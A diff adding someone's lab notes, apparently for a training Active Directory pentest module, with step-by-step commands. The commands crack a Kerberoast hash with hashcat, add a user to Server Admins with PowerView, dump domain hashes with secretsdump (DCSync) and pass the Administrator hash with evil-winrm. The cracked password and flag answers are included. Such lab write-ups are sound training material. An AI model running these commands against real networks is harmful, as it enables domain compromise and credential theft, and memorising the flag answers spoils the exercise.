@@ -70,3 +70,20 @@ $krb5tgs$23$*ttimmons$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/ttimmons*$cacf2fb7
 12) copy has into file on KALI -> i named it ttimmons ->
 13) hashcat -m 13100 -O -w 3 ttimmons /usr/share/wordlists/rockyou.txt 
 output: Repeat09
+
+
+Question 2 - After obtaining Domain Admin rights, authenticate to the domain controller and submit the contents of the flag.txt file on the Administrator Desktop. - 7c09eb1fff981654a3bb3b4a4e0d176a 
+
+1) need to place him in the Server Admins group, thus allowing for a DCSync attack and dumping all hashes of the domain. Using the same RDP connection on the Windows target ACADEMY-AEN-DEV01 that has PowerView from the previous questions, students need to create another PSCredential object and add ttimmons to the Server Admins group to inherit DCSync Privileges:
+2) back to PS session with Hporter CLI - >
+PS C:\Share> $timpass = ConvertTo-SecureString 'Repeat09' -AsPlainText -Force
+PS C:\Share> $timcreds = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\ttimmons', $timpass)
+PS C:\Share> $group = Convert-NameToSid "Server Admins"
+PS C:\Share> Add-DomainGroupMember -Identity $group -Members 'ttimmons' -Credential $timcreds -verbose
+3) once added to proper group -> on KALI run this 
+4) proxychains secretsdump.py ttimmons@172.16.8.3 -just-dc-ntlm
+Output: 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:fd1f7e5564060258ea787ddbb6e6afa2:::
+6) on sudo su KALI -> proxychains evil-winrm -i 172.16.8.3 -u Administrator -H fd1f7e5564060258ea787ddbb6e6afa2 
+7) once in -> cd .. -> cd Desktop -> type flag.txt -> 7c09eb1fff981654a3bb3b4a4e0d176a
+
